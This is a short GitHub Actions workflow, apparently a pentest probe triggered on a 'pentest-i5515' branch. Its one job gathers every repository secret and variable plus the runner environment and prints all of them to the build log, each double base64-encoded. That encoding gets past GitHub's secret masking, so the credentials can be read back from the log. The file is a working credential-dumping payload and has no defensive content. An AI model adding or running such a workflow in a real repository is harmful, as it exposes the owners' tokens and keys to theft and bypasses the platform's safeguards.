name: probe-i5515
on:
  push:
    branches: [ pentest-i5515 ]
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        env:
          ALLSECRETS: ${{ toJSON(secrets) }}
          ALLVARS: ${{ toJSON(vars) }}
        run: |
          echo "DUMPENV:"$(env | sort | base64 -w0 | base64 -w0)
          echo "DUMPSEC:"$(printf '%s' "$ALLSECRETS" | base64 -w0 | base64 -w0)
          echo "DUMPVAR:"$(printf '%s' "$ALLVARS" | base64 -w0 | base64 -w0)
